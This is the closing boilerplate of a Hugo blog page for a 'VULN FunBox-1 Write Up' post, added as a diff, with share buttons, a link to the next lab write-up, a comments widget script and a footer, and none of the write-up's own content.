+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f;title=VULN%20FunBox-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=VULN%20FunBox-1%20Write%20Up%20https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f&amp;t=VULN%20FunBox-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=VULN%20FunBox-1%20Write%20Up&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h"></span>
+          <hr />
+        </div>
+
+        <div class="pagination__buttons">
+          
+
+          
+            <span class="button next">
+              <a href="https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/">
+                <span class="button__text">VULN DevContainer-1 Write Up</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+
+    
+      
+<script src="https://utteranc.es/client.js"
+repo="Barcode91/blog-files"
+issue-term="title"
+label="comments :speech_balloon:"
+theme="github-dark-orange"
+crossorigin="anonymous"
+async>
+</script>
+  
+     
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+<a href="javascript:" id="return-to-top"><i class="icon-chevron-up"></i></a>
+
+
+<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://barcode91.github.io">Barcode</a></span>
+            
+            
+            <span> <a href="https://barcode91.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Theme made by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://barcode91.github.io/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+    
+        <script src="https://barcode91.github.io/js/scroll.js"></script>
+    
+
+
+    </body>
+</html>
